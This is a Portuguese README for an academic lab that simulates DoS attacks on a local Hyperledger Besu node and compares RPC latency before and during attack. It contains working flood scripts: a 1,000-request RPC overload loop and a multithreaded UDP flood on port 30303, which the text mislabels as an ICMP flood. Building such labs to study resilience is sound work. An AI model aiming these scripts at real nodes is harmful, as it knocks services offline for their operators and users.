# 🧠 Projeto de Simulação de Ataque DoS/DDoS em Hyperledger Besu

Este projeto tem como objetivo demonstrar de forma **controlada e educativa** como **ataques de negação de serviço (DoS e DDoS)** podem afetar o desempenho de uma **rede blockchain privada** baseada em **Hyperledger Besu**, observando especialmente o impacto no **tempo médio de resposta das chamadas RPC**.

> ⚠️ **Aviso:** Este projeto é exclusivamente para fins acadêmicos e laboratoriais. Não deve ser utilizado em ambientes de produção nem contra redes públicas.

---

## 🚀 Objetivos do Projeto

- Montar uma rede privada Hyperledger Besu (um nó simples ou uma pequena rede com 2-3 nós).
- Gerar tráfego excessivo para simular ataques:
  - **Ataque à camada de rede:** inundação de pacotes (DoS de rede).
  - **Ataque à camada de aplicação:** sobrecarga via requisições RPC simultâneas (DoS de aplicação).
- Medir o impacto:
  - Aumento no **tempo médio de resposta RPC**.
  - Queda no throughput e na disponibilidade do nó.

---

## ⚙️ Estrutura do Projeto

```

projeto-dos-besu/
│
├── docker-compose.yml       # Configuração do nó Hyperledger Besu
├── config/
│   ├── genesis.json          # Arquivo de configuração da blockchain privada
│   └── besu-config.toml      # Configurações personalizadas do Besu
│
├── scripts/
│   ├── flood_network.py         # Script simples de DoS de rede (ping flood)
│   ├── rpc_overload.sh         # Script para gerar carga RPC (camada de aplicação)
│   └── metrics_rpc.py        # Script para medir o tempo médio de resposta RPC
│
└── README.md

````

---

## 🧩 Pré-requisitos

- Docker e Docker Compose instalados.
- Python 3.10+ com bibliotecas `requests`, `time`, e `statistics`.
- Permissão de administrador para executar Docker (`sudo`).

---

## 🛠️ Como Executar o Projeto

### 1. Inicie o nó Hyperledger Besu

```bash
sudo docker compose up -d
````

Verifique os logs:

```bash
sudo docker logs -f besu-node
```

---

### 2. Teste a comunicação RPC

Com o nó rodando, teste a API RPC:

```bash
curl -X POST --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' http://localhost:8545
```

Se retornar um número de bloco, o nó está operacional ✅

---

### 3. Medir tempo médio de resposta RPC (sem ataque)

Execute:

```bash
python3 scripts/metrics_rpc.py
```

Saída esperada:

```
Tempo médio de resposta RPC: 0.045 segundos
```

---

### 4. Simular ataque DoS na camada de aplicação – Sobrecarga RPC

Abra outro terminal e rode:

```bash
bash scripts/rpc_overload.sh
```

Esse script envia centenas de requisições RPC simultâneas (`eth_blockNumber`).
🧠 Efeito esperado:
O nó Besu começa a responder mais lentamente e pode travar se o ataque persistir.

---

### 5. Simular ataque à camada de rede – Flooding P2P

Em outro terminal (ou container):

```bash
python3 scripts/flood_network.py
```

> Este script simula um ataque de inundação de pacotes na porta P2P (30303).
> 🧠 Efeito esperado:
A porta P2P do Besu será inundada, elevando uso de CPU e travando conexões de peers.

---

### 6. Medir impacto

Execute novamente o medidor de desempenho:

```bash
python3 scripts/metrics_rpc.py
```

Compare os tempos **antes** e **durante o ataque**.

Exemplo de resultado:

| Situação        | Tempo médio RPC (s) | Observação                    |
| --------------- | ------------------- | ----------------------------- |
| Normal          | 0.045               | Resposta estável              |
| Sob ataque RPC  | 0.487               | Aumento de 980%               |
| Sob ataque ICMP | 1.102               | Queda acentuada de desempenho |

---

## 📊 Scripts Importantes

### `metrics_rpc.py`

Mede o tempo médio de resposta de requisições RPC.

```python
import requests, time, statistics

url = "http://localhost:8545"
payload = {"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1}

tempos = []
for _ in range(30):
    inicio = time.time()
    requests.post(url, json=payload)
    tempos.append(time.time() - inicio)

print(f"Tempo médio de resposta RPC: {statistics.mean(tempos):.3f} segundos")
```

---

### `rpc_overload.sh`

Simula ataque de sobrecarga RPC.

```bash
#!/bin/bash
for i in {1..1000}
do
  curl -s -X POST http://127.0.0.1:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest", true],"id":1}' &
done
```

---

### `flood_network.py`

Ataque de inundação ICMP (rede).

```python
import socket
import threading

target_ip = "127.0.0.1"
target_port = 30303

def flood():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"A" * 1024
    while True:
        client.sendto(data, (target_ip, target_port))

for i in range(50):  # número de threads simulando bots
    threading.Thread(target=flood).start()
```

---

## 📚 Conceitos Envolvidos

* **Ataque DoS (Denial of Service):** saturação de recursos de um nó, impedindo o funcionamento normal.
* **Ataque DDoS (Distributed DoS):** múltiplas origens simultâneas causam sobrecarga massiva.
* **Camada de rede:** ataques baseados em pacotes (ICMP, TCP SYN Flood).
* **Camada de aplicação:** ataques via APIs ou RPCs sobrecarregando o processamento.

---

## 🧠 Conclusão

Esse projeto demonstra, de forma simples, como a **resiliência e desempenho** de uma rede **Hyperledger Besu** podem ser comprometidos sob ataques de negação de serviço.
Os resultados podem ser usados para planejar **mitigações** (como firewalls, rate limiting e load balancing).

---

## 👨‍💻 Autor

**João Filho**
Residente em Cibersegurança – PUCPR
Foco: GRC, Blockchain e Segurança Cibernética
📧 contato: [joaofilho1467@gmail.com](mailto:joaofilho1467@gmail.com)